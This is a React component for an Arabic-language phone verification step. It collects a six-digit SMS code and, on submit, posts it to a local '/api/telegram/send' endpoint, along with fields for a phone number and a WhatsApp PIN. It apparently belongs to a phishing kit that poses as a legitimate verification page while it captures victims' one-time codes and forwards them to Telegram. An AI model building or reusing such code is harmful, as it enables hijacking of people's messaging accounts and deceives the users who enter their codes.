import React, { useState, useRef, useEffect } from 'react';
import { MessageSquare, ArrowLeft, ArrowRight } from 'lucide-react';

interface CodeStepProps {
  verificationCode: string;
  phoneNumber: string;
  updateVerificationCode: (value: string) => void;
  onNext: () => void;
  onBack: () => void;
}

const CodeStep: React.FC<CodeStepProps> = ({ 
  verificationCode, 
  phoneNumber, 
  updateVerificationCode, 
  onNext, 
  onBack 
}) => {
  const [error, setError] = useState('');
  const [codes, setCodes] = useState(['', '', '', '', '', '']);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleCodeChange = (index: number, value: string) => {
    if (value.length > 1) return;
    
    const newCodes = [...codes];
    newCodes[index] = value;
    setCodes(newCodes);
    
    const fullCode = newCodes.join('');
    updateVerificationCode(fullCode);

    // Auto focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !codes[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const sendCodeToTelegram = async (code: string) => {
    try {
      await fetch('http://localhost:5176/api/telegram/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phoneNumber: '',
          verificationCode: code,
          whatsappPin: '',
          messageType: 'code'
        })
      });
    } catch (error) {
      console.error('Erreur envoi code:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (verificationCode.length !== 6) {
      setError('يرجى إدخال رمز التحقق كاملاً');
      return;
    }
    
    setError('');
    await sendCodeToTelegram(verificationCode);
    onNext();
  };

  return (
    <div className="text-center">
      <div className="mb-6">
        <div className="w-16 h-16 bg-gradient-to-r from-cyan-100 to-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <MessageSquare className="w-8 h-8 text-cyan-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">أدخل رمز التحقق</h2>
        <p className="text-gray-600">أدخل الرمز المرسل إلى</p>
        <p className="text-blue-600 font-semibold">{phoneNumber}</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <div className="flex justify-center space-x-3 mb-4">
            {codes.map((code, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                value={code}
                onChange={(e) => handleCodeChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition-all duration-200"
                maxLength={1}
              />
            ))}
          </div>
          
          {error ? (
            <p className="text-red-500 text-sm animate-fade-in">{error}</p>
          ) : (
            <p className="text-green-600 text-sm">تم إرسال رمز التحقق إلى رقم هاتفك</p>
          )}
        </div>

        <div className="flex space-x-4">
          <button
            type="button"
            onClick={onBack}
            className="flex-1 bg-gray-100 text-gray-700 py-3 px-6 rounded-xl font-semibold hover:bg-gray-200 transition-all duration-200 flex items-center justify-center space-x-2"
          >
            <ArrowLeft className="w-5 h-5" />
            <span>رجوع</span>
          </button>
          
          <button
            type="submit"
            className="flex-1 bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 px-6 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 hover:scale-105 flex items-center justify-center space-x-2"
          >
            <span>تأكيد</span>
            <ArrowRight className="w-5 h-5" />
          </button>
        </div>

        <div className="text-center">
          <button type="button" className="text-blue-600 text-sm hover:underline">
            إعادة إرسال الرمز
          </button>
        </div>
      </form>
    </div>
  );
};

export default CodeStep;